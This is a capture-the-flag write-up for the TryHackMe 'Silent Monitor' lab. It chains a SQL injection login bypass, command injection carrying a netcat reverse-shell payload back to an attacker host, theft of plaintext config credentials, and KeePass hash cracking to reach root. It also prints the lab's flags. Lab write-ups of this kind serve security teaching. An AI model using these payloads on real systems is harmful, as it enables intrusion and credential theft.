# Silent Monitor - TryHackMe Writeup

## Overview

Today we are going to solve another **TryHackMe** challenge which is a **Medium** difficulty Linux machine named **Silent Monitor**.

The scenario we are given is:

> CorpNet's internal Network Operations Centre (NOC) has been running quietly for years, monitoring hosts, logging events, and keeping the infrastructure alive. Or so it seems. A disgruntled contractor reports that someone inside the NOC has been leaving security holes, hiding information, and relying on insecure practices. Although everything appears normal from the outside, the real objective is to compromise the monitoring portal, move through the system, and uncover what is actually running behind the dashboard.

Our objective is to gain initial access to the machine and escalate our privileges until we obtain the root flag.

**Target IP**

```text
10.48.184.20
```

---

# Reconnaissance

As always, we begin by performing a full TCP port scan.

```bash
nmap -p- 10.48.184.20
```

The scan reveals two open ports.

```text
22/tcp   open  ssh
5050/tcp open  http
```

Since only two services are exposed, we continue by performing service detection and version enumeration.

```bash
nmap -sC -sV 10.48.184.20
```

Result:

```text
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
5050/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
```

The HTTP service is powered by **Werkzeug**, a Python web server, while SSH is available for remote administration.

---

# Web Enumeration

Opening port **5050** in the browser presents us with the **CorpNet Network Operations Centre** dashboard.

While browsing the homepage we notice a version number displayed in the footer.

```text
NOC Portal v2.4.1
```

This immediately tells us that this is a custom internal monitoring application.

To better understand the application, we intercept all requests using **Burp Suite** and begin exploring the available functionality.

---

# Directory Enumeration

Next, we perform directory brute forcing using Gobuster.

```bash
gobuster dir \
-u http://10.48.184.20:5050/ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

Interesting discovery:

```text
/internal
```

Browsing to:

```text
http://10.48.184.20:5050/internal
```

reveals an **internal login portal**.

---

# SQL Injection Authentication Bypass

The login page appears to validate credentials against a backend database.

A simple authentication bypass payload is tested.

```sql
admin' OR 1=1 --+
```

The application accepts the payload and authenticates us without knowing the real password.

We are now inside the internal NOC dashboard.

This confirms the login page is vulnerable to **SQL Injection** due to improper input sanitization.

---

# Exploring the Dashboard

After logging in, we begin exploring the available pages.

Several interesting features are available:

* Audit Logs
* Host Health
* Monitoring Dashboard
* Internal User Information

Inside the audit logs we observe multiple users along with their corresponding internal IP addresses.

While testing the **Host Health** functionality, we notice that the application allows administrators to ping arbitrary IP addresses.

This immediately raises suspicion of possible command injection.

---

# Command Injection

Testing confirms that the application does not properly sanitize user input.

Instead of supplying only an IP address, additional shell commands can also be executed.

Our attacker machine IP:

```text
10.48.102.64
```

Netcat listener:

```bash
nc -lvnp 4444
```

Payload supplied through Burp Suite:

```bash
busybox nc 10.48.102.64 4444 -e /bin/bash
```

As soon as the request is sent, a reverse shell connects back to our listener.

```text
uid=33(www-data)
gid=33(www-data)
```

We now have command execution as the **www-data** user.

---

# Shell Stabilization

A fully interactive shell makes post-exploitation much easier.

First, verify Python exists.

```bash
which python3
```

```text
/usr/bin/python3
```

Spawn a proper TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell.

```text
CTRL + Z
```

Fix the terminal.

```bash
stty raw -echo
fg
```

Finally export the terminal.

```bash
export TERM=xterm
```

The shell is now fully interactive.

---

# Enumerating the Application

Inside the application directory we discover an interesting configuration file.

```bash
cat secret.config
```

Contents:

```ini
[database]
path=/opt/netops/netops.db

[backup_agent]
run_as=sysadmin
password=S3cur3Backup$Acc3ss!
```

This file contains sensitive configuration information.

More importantly, it stores plaintext credentials for the backup agent.

Developers even left themselves a reminder.

```text
TODO:
migrate to secrets manager
```

Clearly this migration never happened.

---

# Lateral Movement

Instead of continuing local enumeration, we attempt SSH using the recovered credentials.

```text
Username:
sysadmin

Password:
S3cur3Backup$Acc3ss!
```

SSH login succeeds.

```bash
ssh sysadmin@10.48.184.20
```

We are now operating as **sysadmin**.

---

# User Flag

Listing the home directory shows the user flag.

```bash
cat user.txt
```

```text
THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
```

---

# Privilege Escalation Enumeration

Looking inside the home directory reveals another interesting folder.

```text
backups
```

Inside:

```text
README.txt
infrastructure.kdbx
```

Reading the README explains the purpose.

```text
Infrastructure credentials

Periodic exports from the credential store are placed here.

Treat all files as confidential.
```

The important file is:

```text
infrastructure.kdbx
```

which is a **KeePass Password Database**.

Checking sudo permissions reveals nothing useful.

```bash
sudo -l
```

```text
Sorry, user sysadmin may not run sudo.
```

Since local privilege escalation appears limited, we decide to attack the KeePass database instead.

---

# Extracting the KeePass Hash

First generate a John hash.

```bash
keepass2john infrastructure.kdbx > kdbx.hash
```

Then crack it.

```bash
john \
--wordlist=/usr/share/wordlists/rockyou.txt \
kdbx.hash
```

Eventually John successfully recovers the master password.

```text
spring
```

---

# Opening the KeePass Database

Using the recovered password, we unlock the KeePass vault.

Inside we discover privileged credentials.

The database password itself is:

```text
S3cur3P4ss0nK33p4ss
```

The vault also contains the **root credentials**, allowing us to switch directly to the root account.

```bash
su root
```

Authentication succeeds.

---

# Root Flag

Finally we obtain the root flag.

```bash
cat /root/root.txt
```

```text
THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
```

Machine complete.

---

# Attack Chain

```text
Nmap Scan
      │
      ▼
Werkzeug Web Server
      │
      ▼
Directory Enumeration
      │
      ▼
/internal Login Portal
      │
      ▼
SQL Injection Authentication Bypass
      │
      ▼
Authenticated Dashboard
      │
      ▼
Command Injection (Ping Function)
      │
      ▼
Reverse Shell (www-data)
      │
      ▼
Application Enumeration
      │
      ▼
Plaintext Credentials in secret.config
      │
      ▼
SSH Login as sysadmin
      │
      ▼
KeePass Database Discovery
      │
      ▼
Password Cracking using keepass2john + John
      │
      ▼
Recover Root Credentials
      │
      ▼
Root Shell
```

---

# Vulnerabilities Identified

* SQL Injection Authentication Bypass
* Command Injection in Host Health Function
* Sensitive Credentials Stored in Plaintext Configuration Files
* Password Reuse Across Services
* KeePass Database Stored on the Server
* Weak KeePass Master Password
* Root Credentials Stored Inside KeePass
* Lack of Secrets Management

---

# Tools Used

* Nmap
* Gobuster
* Burp Suite
* Netcat
* Python3
* SSH
* keepass2john
* John the Ripper

---

# Lessons Learned

This machine demonstrates how several small security mistakes can quickly lead to complete system compromise.

The initial foothold was achieved through a vulnerable web application that suffered from both SQL Injection and Command Injection. Once command execution was obtained, sensitive configuration files exposed plaintext service credentials that allowed lateral movement through SSH. During privilege escalation, an accessible KeePass database protected only by a weak master password became the final stepping stone to root access.

Although each vulnerability on its own may appear minor, chaining them together resulted in a complete compromise of the server. Proper input validation, secure secrets management, stronger password policies, and restricting access to credential databases would have prevented the entire attack chain.

---

# Flags

## User Flag

```text
THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
```

## Root Flag

```text
THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
```

---

**Machine Status:** Complete ✅
